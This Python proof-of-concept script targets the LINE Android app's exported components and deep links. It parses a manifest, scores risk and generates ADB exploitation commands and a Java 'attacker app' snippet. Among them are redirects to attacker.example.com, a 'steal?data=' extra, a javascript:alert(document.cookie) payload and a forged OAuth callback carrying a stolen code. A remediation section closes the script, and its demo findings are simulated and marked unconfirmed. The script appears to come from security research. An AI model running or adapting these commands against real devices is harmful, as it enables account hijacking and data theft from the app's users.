#!/usr/bin/env python3
"""
================================================================================
PoC-04 | Exported Activity Without Permission — Deep Link Hijacking
================================================================================
Vulnerability : CWE-926 — Improper Export of Android Application Components
Severity      : HIGH | CVSS 7.3 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
Target        : jp.naver.line.android exported Activities, Services, Receivers
Attack Vector : Malicious app on device sends crafted Intent to exported component

This PoC demonstrates:
  1. Parse AndroidManifest.xml for all unprotected exported components
  2. Identify exploitable deep-link schemes and intent patterns
  3. Generate ADB shell commands to trigger each vulnerable component
  4. Generate a proof-of-concept Android attacker app Intent code snippet

EDUCATIONAL PURPOSE ONLY
Version       : 1.0  (February 2026)
Author        : deepquest
Blog          : https://deepquest.code511.com/blog/
Target App    : jp.naver.line.android v26.1.1 (260110123)
Note          : Exported component & deep link hijacking scanner — investigative (finding unconfirmed)
================================================================================
"""

import sys
import re
import json
import argparse
import xml.etree.ElementTree as ET
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import Optional

BANNER = r"""
 ____  ___   ____      ___  _  _
|  _ \/ _ \ / ___|    / _ \| || |
| |_) | | | | |      | | | | || |_
|  __/| |_| | |___   | |_| |__   _|
|_|    \___/ \____|   \___/   |_|

  Exported Component & Deep Link Hijacking PoC
  CWE-926 | CVSS 7.3 | HIGH
"""

ANDROID_NS = "http://schemas.android.com/apk/res/android"

# Dangerous Intent categories and actions that can be abused
HIGH_RISK_ACTIONS = {
    "android.intent.action.VIEW":           "Deep link / URL handler",
    "android.intent.action.SEND":           "Share content handler — data theft",
    "android.intent.action.SENDTO":         "Message send handler",
    "android.intent.action.PICK":           "File/content picker — data access",
    "android.intent.action.GET_CONTENT":    "Content retrieval — file exfiltration",
    "android.intent.action.MAIN":           "Launcher activity",
    "android.intent.action.DEFAULT":        "Default URI handler",
}

HIGH_RISK_SCHEMES = [
    "line",         # LINE custom scheme — direct API access
    "linecamera",   # LINE Camera scheme
    "lineshop",     # LINE Shopping
    "linetv",       # LINE TV
    "http",         # Generic HTTP (if exported — open redirect)
    "https",        # Generic HTTPS
    "intent",       # Android intent scheme (dangerous)
    "javascript",   # JavaScript URI (WebView XSS vector)
]


@dataclass
class ExportedComponent:
    component_type:  str          # activity | service | receiver | provider
    class_name:      str
    is_exported:     bool
    permission:      Optional[str]
    intent_filters:  list = field(default_factory=list)
    deep_link_uris:  list = field(default_factory=list)
    severity:        str = "INFO"
    attack_vectors:  list = field(default_factory=list)
    adb_commands:    list = field(default_factory=list)


def get_attr(elem, attr: str) -> Optional[str]:
    """Get an Android-namespaced attribute value."""
    return elem.get(f"{{{ANDROID_NS}}}{attr}")


def parse_intent_filter(filter_elem) -> dict:
    """Parse an <intent-filter> element into a structured dict."""
    actions    = [get_attr(a, "name") for a in filter_elem.findall("action")]
    categories = [get_attr(c, "name") for c in filter_elem.findall("category")]
    data_elems = filter_elem.findall("data")

    data_uris = []
    for d in data_elems:
        scheme  = get_attr(d, "scheme")
        host    = get_attr(d, "host")
        path    = get_attr(d, "path") or get_attr(d, "pathPrefix") or get_attr(d, "pathPattern")
        mime    = get_attr(d, "mimeType")
        port    = get_attr(d, "port")

        if scheme:
            uri = scheme + "://"
            if host:  uri += host
            if port:  uri += ":" + port
            if path:  uri += path
            data_uris.append({
                "scheme": scheme, "host": host, "path": path,
                "mime": mime, "full": uri,
            })

    return {
        "actions":    [a for a in actions if a],
        "categories": [c for c in categories if c],
        "data_uris":  data_uris,
    }


def assess_severity(component: ExportedComponent) -> tuple[str, list]:
    """Determine severity and attack vectors for an exported component."""
    vectors = []
    severity = "INFO"

    if not component.is_exported:
        return "INFO", []

    # No permission required — any app can invoke this
    if component.permission is None:
        if component.component_type == "activity":
            vectors.append("Any installed app can launch this Activity")
        elif component.component_type == "service":
            vectors.append("Any installed app can bind/start this Service")
        elif component.component_type == "receiver":
            vectors.append("Any app can send broadcasts to this Receiver")
        severity = "MEDIUM"

    # Check intent filter risk
    for filt in component.intent_filters:
        for action in filt.get("actions", []):
            if action in HIGH_RISK_ACTIONS:
                vectors.append(f"Handles high-risk action: {action} ({HIGH_RISK_ACTIONS[action]})")
                severity = "HIGH"

        for uri in filt.get("data_uris", []):
            scheme = uri.get("scheme", "")
            if scheme in HIGH_RISK_SCHEMES:
                vectors.append(f"Handles risky URI scheme: {scheme}://")
                if scheme in ("line", "linecamera"):
                    severity = "HIGH"
                    vectors.append(f"LINE custom scheme — direct internal API access possible")
            if scheme == "javascript":
                severity = "CRITICAL"
                vectors.append("JavaScript URI scheme — XSS / code execution vector")

    # Deep link open redirect potential
    if any("VIEW" in str(filt.get("actions", [])) for filt in component.intent_filters):
        if any(uri.get("scheme") in ("http","https") for filt in component.intent_filters
               for uri in filt.get("data_uris", [])):
            vectors.append("Open redirect possible — can be forced to load attacker URL")
            severity = "HIGH"

    return severity, vectors


def generate_adb_commands(component: ExportedComponent, package: str) -> list[str]:
    """Generate ADB shell commands to trigger the exported component."""
    cmds = []
    comp_short = component.class_name.replace(package, "").lstrip(".")

    if component.component_type == "activity":
        # Basic launch
        cmds.append(f"adb shell am start -n {package}/{component.class_name}")

        # Deep link attempts
        for filt in component.intent_filters:
            for uri in filt.get("data_uris", []):
                full_uri = uri.get("full", "")
                if full_uri:
                    cmds.append(
                        f"adb shell am start -n {package}/{component.class_name} "
                        f"-d '{full_uri}/poc_payload'"
                    )
                    # Open redirect test
                    if uri.get("scheme") in ("http", "https"):
                        cmds.append(
                            f"adb shell am start -n {package}/{component.class_name} "
                            f"-d 'https://attacker.example.com/evil'"
                        )
                    # LINE scheme deep link test
                    if uri.get("scheme") == "line":
                        cmds.append(
                            f"adb shell am start -a android.intent.action.VIEW "
                            f"-d 'line://msg/redirect?url=https://attacker.example.com'"
                        )

    elif component.component_type == "service":
        cmds.append(f"adb shell am startservice -n {package}/{component.class_name}")

    elif component.component_type == "receiver":
        for filt in component.intent_filters:
            for action in filt.get("actions", []):
                cmds.append(
                    f"adb shell am broadcast -a {action} "
                    f"-n {package}/{component.class_name}"
                )

    return cmds[:5]  # Limit to 5 commands per component


def parse_manifest(manifest_path: str, package: str = "jp.naver.line.android") -> list[ExportedComponent]:
    """Parse AndroidManifest.xml and extract all exported components."""
    components = []
    try:
        tree = ET.parse(manifest_path)
        root = tree.getroot()
    except ET.ParseError as e:
        print(f"  [!] XML parse error: {e}")
        return components

    app_elem = root.find("application")
    if app_elem is None:
        return components

    # Global debuggable / backup flags
    debuggable = get_attr(app_elem, "debuggable") == "true"
    allow_backup = get_attr(app_elem, "allowBackup") != "false"
    if debuggable:
        print("  [!!!] CRITICAL: application is debuggable!")
    if allow_backup:
        print("  [!] HIGH: android:allowBackup=true — ADB backup extraction possible")

    for comp_tag in ["activity", "service", "receiver", "provider"]:
        for elem in app_elem.findall(comp_tag):
            class_name = get_attr(elem, "name") or ""
            if class_name.startswith("."):
                class_name = package + class_name

            exported_val = get_attr(elem, "exported")
            intent_filters = elem.findall("intent-filter")
            # Android default: if intent-filter present and exported not set → exported=true
            is_exported = (
                exported_val == "true" or
                (exported_val is None and len(intent_filters) > 0)
            )
            if not is_exported:
                continue

            permission = get_attr(elem, "permission")
            filters = [parse_intent_filter(f) for f in intent_filters]

            # Collect all deep link URIs
            deep_links = []
            for f in filters:
                deep_links.extend([u["full"] for u in f.get("data_uris", []) if u.get("full")])

            comp = ExportedComponent(
                component_type = comp_tag,
                class_name     = class_name,
                is_exported    = True,
                permission     = permission,
                intent_filters = filters,
                deep_link_uris = deep_links,
            )
            comp.severity, comp.attack_vectors = assess_severity(comp)
            comp.adb_commands = generate_adb_commands(comp, package)
            components.append(comp)

    return components


def generate_attacker_app_snippet(component: ExportedComponent, package: str) -> str:
    """Generate Android Java code snippet for an attacker application."""
    deep_link = component.deep_link_uris[0] if component.deep_link_uris else "line://poc"
    return f"""
// ─── Attacker App Code Snippet (Java/Android) ───────────────────────────────
// Target: {package}/{component.class_name}
// Severity: {component.severity}

Intent intent = new Intent();
intent.setComponent(new ComponentName(
    "{package}",
    "{component.class_name}"
));
intent.setData(Uri.parse("{deep_link}/../../attacker_payload"));
intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

// Inject extra data to test parameter handling
intent.putExtra("url",  "https://attacker.example.com/steal?data=");
intent.putExtra("token","injected_token_value");
intent.putExtra("mid",  "u0000000000000000000000000000000");

try {{
    startActivity(intent);
    // Or for Service: startService(intent);
    // Or for Broadcast: sendBroadcast(intent);
}} catch (ActivityNotFoundException e) {{
    // Component may require specific flags or data
    Log.e("POC", "Launch failed: " + e.getMessage());
}}
// ─────────────────────────────────────────────────────────────────────────────
"""


def demo_mode():
    print("\n[DEMO MODE] — Exported Component Analysis for LINE\n")
    package = "jp.naver.line.android"

    # Simulate manifest findings
    demo_components = [
        ExportedComponent(
            component_type="activity",
            class_name=f"{package}.ui.DeepLinkHandlerActivity",
            is_exported=True,
            permission=None,
            intent_filters=[{
                "actions": ["android.intent.action.VIEW"],
                "categories": ["android.intent.category.DEFAULT", "android.intent.category.BROWSABLE"],
                "data_uris": [
                    {"scheme": "line", "host": "msg", "path": "/redirect", "full": "line://msg/redirect"},
                    {"scheme": "https", "host": "line.me", "path": "/R/", "full": "https://line.me/R/"},
                ]
            }],
            deep_link_uris=["line://msg/redirect", "https://line.me/R/"],
            severity="HIGH",
            attack_vectors=[
                "Any installed app can launch this Activity",
                "LINE custom scheme — direct internal API access possible",
                "Open redirect possible — can be forced to load attacker URL",
            ],
            adb_commands=[
                f"adb shell am start -n {package}/.ui.DeepLinkHandlerActivity",
                f"adb shell am start -n {package}/.ui.DeepLinkHandlerActivity -d 'line://msg/redirect?url=https://attacker.example.com'",
                f"adb shell am start -a android.intent.action.VIEW -d 'line://msg/redirect?url=javascript:alert(document.cookie)'",
            ]
        ),
        ExportedComponent(
            component_type="activity",
            class_name=f"{package}.ui.OAuthCallbackActivity",
            is_exported=True,
            permission=None,
            intent_filters=[{
                "actions": ["android.intent.action.VIEW"],
                "categories": ["android.intent.category.DEFAULT"],
                "data_uris": [{"scheme": "line", "host": "oauth", "path": "/callback", "full": "line://oauth/callback"}]
            }],
            deep_link_uris=["line://oauth/callback"],
            severity="HIGH",
            attack_vectors=[
                "OAuth callback can be hijacked by registering same URI scheme",
                "Intercepting OAuth code allows account takeover",
            ],
            adb_commands=[
                f"adb shell am start -n {package}/.ui.OAuthCallbackActivity -d 'line://oauth/callback?code=STOLEN_CODE&state=csrf_token'",
            ]
        ),
        ExportedComponent(
            component_type="receiver",
            class_name=f"{package}.push.LineFirebaseMessagingService",
            is_exported=True,
            permission=None,
            intent_filters=[{
                "actions": ["com.google.firebase.MESSAGING_EVENT"],
                "categories": [],
                "data_uris": []
            }],
            deep_link_uris=[],
            severity="MEDIUM",
            attack_vectors=["Broadcast receiver accepts external push messages without validation"],
            adb_commands=[
                f"adb shell am broadcast -a com.google.firebase.MESSAGING_EVENT -n {package}/.push.LineFirebaseMessagingService",
            ]
        ),
    ]

    sev_order = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
    print(f"  Package: {package}")
    print(f"  Exported components found (DEMO): {len(demo_components)}\n")

    for comp in sorted(demo_components, key=lambda x: sev_order.index(x.severity)):
        print(f"  ┌─[{comp.severity}] {comp.component_type.upper()}: {comp.class_name.split('.')[-1]}")
        print(f"  │  Full class : {comp.class_name}")
        print(f"  │  Permission : {comp.permission or 'NONE — unprotected'}")
        if comp.deep_link_uris:
            print(f"  │  Deep links : {', '.join(comp.deep_link_uris)}")
        print(f"  │  Attack vectors:")
        for v in comp.attack_vectors:
            print(f"  │    - {v}")
        print(f"  │  ADB exploitation commands:")
        for cmd in comp.adb_commands:
            print(f"  │    $ {cmd}")
        print(f"  └{'─'*60}")
        print()

    # Show attacker app snippet for highest severity component
    print("─" * 68)
    print("  ATTACKER APP JAVA SNIPPET (highest severity component)")
    print("─" * 68)
    print(generate_attacker_app_snippet(demo_components[0], package))

    print("─" * 68)
    print("  REMEDIATION")
    print("─" * 68)
    print("""
  1. Add android:permission to all exported components:
     <activity android:name=".ui.DeepLinkHandlerActivity"
               android:exported="true"
               android:permission="android.permission.SIGNATURE_PERMISSION" />

  2. Validate and sanitize all incoming URI data:
     Uri data = getIntent().getData();
     if (data != null) {{
         String url = data.getQueryParameter("url");
         if (!url.startsWith("https://line.me/")) {{
             throw new SecurityException("Invalid redirect target");
         }}
     }}

  3. Use App Links (HTTPS) instead of custom schemes to prevent hijacking:
     <data android:scheme="https" android:host="line.me" />
     + serve /.well-known/assetlinks.json on line.me

  4. For OAuth callbacks — use PKCE and validate state parameter.
""")


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(
        description="PoC-04: Exported component & deep link hijacking analyzer"
    )
    parser.add_argument("--manifest", help="Path to AndroidManifest.xml")
    parser.add_argument("--package",  default="jp.naver.line.android")
    parser.add_argument("--out",      default="exported_components_report.json")
    parser.add_argument("--demo",     action="store_true")
    args = parser.parse_args()

    if args.demo or not args.manifest:
        demo_mode()
        return

    print(f"\n[+] Parsing manifest: {args.manifest}")
    components = parse_manifest(args.manifest, args.package)

    sev_counts = {}
    for comp in components:
        sev_counts[comp.severity] = sev_counts.get(comp.severity, 0) + 1

    print(f"\n[+] Exported components found: {len(components)}")
    print(f"    Severity breakdown: {sev_counts}")

    for comp in sorted(components, key=lambda x: ["CRITICAL","HIGH","MEDIUM","LOW","INFO"].index(x.severity)):
        print(f"\n  [{comp.severity}] {comp.component_type}: {comp.class_name}")
        for v in comp.attack_vectors:
            print(f"    - {v}")
        for cmd in comp.adb_commands[:2]:
            print(f"    $ {cmd}")

    report = {"components": [asdict(c) for c in components], "summary": sev_counts}
    with open(args.out, "w") as f:
        json.dump(report, f, indent=2)
    print(f"\n[+] Report saved: {args.out}")


if __name__ == "__main__":
    main()
